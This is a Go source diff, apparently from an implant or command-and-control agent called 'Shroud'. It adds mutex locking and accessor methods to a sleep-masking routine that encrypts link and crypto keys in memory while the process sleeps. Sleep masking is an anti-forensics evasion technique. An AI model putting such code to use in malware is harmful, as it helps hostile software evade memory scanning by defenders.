@@ -3,11 +3,14 @@ package process
 import (
 	"crypto/rand"
 	"io"
+	"sync"
 	"time"
 
 	"Shroud/crypto"
 	"Shroud/global"
 )
+
+var sleepMu sync.Mutex
 
 type sleepState struct {
 	ephemeralKey []byte
@@ -24,6 +27,9 @@ func SleepMask(duration time.Duration) {
 }
 
 func mask() {
+	sleepMu.Lock()
+	defer sleepMu.Unlock()
+
 	ek := make([]byte, 32)
 	if _, err := io.ReadFull(rand.Reader, ek); err != nil {
 		return
@@ -31,11 +37,15 @@ func mask() {
 
 	st := &sleepState{ephemeralKey: ek}
 
-	if global.Session != nil && len(global.Session.LinkKey) > 0 {
-		enc, err := crypto.AESEncrypt(global.Session.LinkKey, ek)
-		if err == nil {
-			st.encLinkKey = enc
-			crypto.Wipe(global.Session.LinkKey)
+	if global.Session != nil {
+		lk := global.Session.GetLinkKey()
+		if len(lk) > 0 {
+			enc, err := crypto.AESEncrypt(lk, ek)
+			if err == nil {
+				st.encLinkKey = enc
+				crypto.Wipe(lk)
+				global.Session.SetLinkKey(lk)
+			}
 		}
 	}
 	if global.G_Component != nil && len(global.G_Component.CryptoKey) > 0 {
@@ -50,6 +60,9 @@ func mask() {
 }
 
 func unmask() {
+	sleepMu.Lock()
+	defer sleepMu.Unlock()
+
 	st := currentSleep
 	if st == nil {
 		return
@@ -59,7 +72,7 @@ func unmask() {
 	if len(st.encLinkKey) > 0 && global.Session != nil {
 		dec, err := crypto.AESDecrypt(st.encLinkKey, st.ephemeralKey)
 		if err == nil {
-			copy(global.Session.LinkKey, dec)
+			global.Session.SetLinkKey(dec)
 		}
 	}
 	if len(st.encCryptoKey) > 0 && global.G_Component != nil {
